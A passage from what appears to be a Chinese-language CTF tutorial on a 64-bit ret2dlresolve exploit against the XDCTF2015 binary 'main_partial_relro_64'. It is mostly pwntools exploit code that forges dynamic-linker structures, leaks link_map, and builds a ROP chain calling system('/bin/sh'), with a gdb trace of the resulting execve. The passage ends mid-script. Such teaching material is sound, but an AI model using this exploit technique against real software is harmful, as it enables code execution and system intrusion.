    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>


    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=o>+</span><span class=n>sh</span><span class=p>)</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>


<span class=c1># rop = ROP(&quot;./main_partial_relro_64&quot;)</span>
<span class=c1># rop.raw(offset*&#39;a&#39;)</span>
<span class=c1># sh = &quot;/bin/sh\x00&quot;</span>
<span class=c1># bin_sh_addr = store_addr+len(resolve_data)</span>
<span class=c1># rop.raw(csu(0, 1 ,elf.got[&#39;read&#39;],0,bin_sh_addr,len(sh)))</span>
<span class=c1># rop.raw(vuln_addr)</span>
<span class=c1># rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span>
<span class=c1># io.send(rop.chain())</span>
<span class=c1># io.send(sh)</span>


<span class=c1># leak link_map addr</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x601008</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>link_map_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>link_map_addr</span><span class=p>))</span>


<span class=c1># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>link_map_addr</span><span class=o>+</span><span class=mh>0x1c8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=c1># rop.raw(&#39;a&#39;*(256-len(rop.chain())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>這時，再次嘗試一下，發現</p> <div class=highlight><pre><span></span><code> ► 0x7f5a187703ec &lt;do_system+1180&gt;       call   execve &lt;execve&gt;
        path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* &#39;/bin/sh&#39; */
        argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* &#39;sh&#39; */
        envp: 0x7fff68270538 ◂— 0x6161616100000000
</code></pre></div> <p>這時候 envp 被污染的數據就只有 0x61 了，即我們填充的數據 'a'。那就好辦了，我們只需要把所有的 pad 都替換爲 <code>\x00</code> 即可。</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=c1># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>

<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=n>func_name</span><span class=p>,</span> <span class=n>resolve_addr</span><span class=p>):</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>rel_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.rela.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>relaent</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_RELAENT&quot;</span><span class=p>)</span> <span class=c1># reloc entry size</span>

    <span class=n>dynsym</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynsym&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>
    <span class=n>syment</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>dynamic_value_by_tag</span><span class=p>(</span><span class=s2>&quot;DT_SYMENT&quot;</span><span class=p>)</span> <span class=c1># symbol entry size</span>

    <span class=n>dynstr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.dynstr&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>


    <span class=c1># construct fake function string</span>
    <span class=n>func_string_addr</span> <span class=o>=</span> <span class=n>store_addr</span>
    <span class=n>resolve_data</span> <span class=o>=</span> <span class=n>func_name</span> <span class=o>+</span> <span class=s2>&quot;</span><span class=se>\x00</span><span class=s2>&quot;</span>

    <span class=c1># construct fake symbol</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>syment</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>syment</span> <span class=c1># align syment size</span>
    <span class=n>symbol_addr</span> <span class=o>=</span> <span class=n>symbol_addr</span><span class=o>+</span><span class=n>pad</span>
    <span class=n>symbol</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>func_string_addr</span><span class=o>-</span><span class=n>dynstr</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mh>0x12</span><span class=p>)</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>symbol_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_addr</span> <span class=o>-</span> <span class=n>dynsym</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span> <span class=n>symbol</span>

    <span class=c1># construct fake reloc </span>
    <span class=n>reloc_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>
    <span class=n>offset</span> <span class=o>=</span> <span class=n>reloc_addr</span> <span class=o>-</span> <span class=n>rel_plt</span>
    <span class=n>pad</span> <span class=o>=</span> <span class=n>relaent</span> <span class=o>-</span> <span class=n>offset</span> <span class=o>%</span> <span class=n>relaent</span> <span class=c1># align relaent size</span>
    <span class=n>reloc_addr</span> <span class=o>+=</span><span class=n>pad</span>
    <span class=n>reloc_index</span> <span class=o>=</span> <span class=p>(</span><span class=n>reloc_addr</span><span class=o>-</span><span class=n>rel_plt</span><span class=p>)</span><span class=o>/</span><span class=mi>24</span>
    <span class=n>rinfo</span> <span class=o>=</span> <span class=p>(</span><span class=n>symbol_index</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=o>|</span> <span class=mi>7</span>
    <span class=n>write_reloc</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>resolve_addr</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>rinfo</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=n>pad</span>
    <span class=n>resolve_data</span> <span class=o>+=</span><span class=n>write_reloc</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>reloc_index</span><span class=p>)</span>
    <span class=k>return</span> <span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>store_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>
<span class=n>sh</span> <span class=o>=</span> <span class=s2>&quot;/bin/sh</span><span class=se>\x00</span><span class=s2>&quot;</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>resolve_data</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>store_addr</span><span class=p>,</span> <span class=s2>&quot;system&quot;</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&quot;write&quot;</span><span class=p>])</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>store_addr</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>sh</span><span class=p>)))</span>  
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s2>&quot;a&quot;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=k>assert</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span><span class=o>&lt;=</span><span class=mi>256</span><span class=p>)</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=c1># send resolve data</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>resolve_data</span><span class=o>+</span><span class=n>sh</span><span class=p>)</span>
<span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=n>store_addr</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>resolve_data</span><span class=p>)</span>


<span class=c1># rop = ROP(&quot;./main_partial_relro_64&quot;)</span>
<span class=c1># rop.raw(offset*&#39;\x00&#39;)</span>
<span class=c1># sh = &quot;/bin/sh\x00&quot;</span>
<span class=c1># bin_sh_addr = store_addr+len(resolve_data)</span>
<span class=c1># rop.raw(csu(0, 1 ,elf.got[&#39;read&#39;],0,bin_sh_addr,len(sh)))</span>
<span class=c1># rop.raw(vuln_addr)</span>
<span class=c1># rop.raw(&quot;a&quot;*(256-len(rop.chain())))</span>
<span class=c1># io.send(rop.chain())</span>
<span class=c1># io.send(sh)</span>


<span class=c1># leak link_map addr</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;write&#39;</span><span class=p>],</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x601008</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>link_map_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
<span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>link_map_addr</span><span class=p>))</span>


<span class=c1># set l-&gt;l_info[VERSYMIDX(DT_VERSYM)] =  NULL</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>csu</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>1</span> <span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=mi>0</span><span class=p>,</span><span class=n>link_map_addr</span><span class=o>+</span><span class=mh>0x1c8</span><span class=p>,</span><span class=mi>8</span><span class=p>))</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>vuln_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>256</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>


<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
